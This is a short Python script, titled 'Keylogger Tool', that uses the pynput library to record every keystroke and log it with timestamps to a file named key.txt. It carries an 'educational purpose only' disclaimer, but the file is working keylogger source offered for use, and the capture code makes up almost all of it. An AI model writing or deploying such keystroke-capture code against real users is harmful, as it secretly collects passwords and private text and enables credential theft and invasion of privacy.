print("--------------------------------------------Keylogger Tool --------------------------------------------------")
print("\n")
print("*************************************************************************************************************")


print("*This tool is made for educational purpose only and should not be used for any unethical purpose and if used* \n*the creator of the code will not be responsible for any unetical activities.                               *")

print("*************************************************************************************************************")
print("\n")
import pynput
import time
import os

print("Listener is up and running \nUse CTRL+Z to stop the keylogger \nThe keystrokes are saved in a file called  key.txt in the same directory as this python file  \nUse cat key.txt to view the logs\n")


from pynput.keyboard import Key, Listener  
import logging
 
logging.basicConfig(filename=("key.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
 
def on_press(key):
    logging.info(str(key))
 
with Listener(on_press=on_press) as rec :
    rec.join()
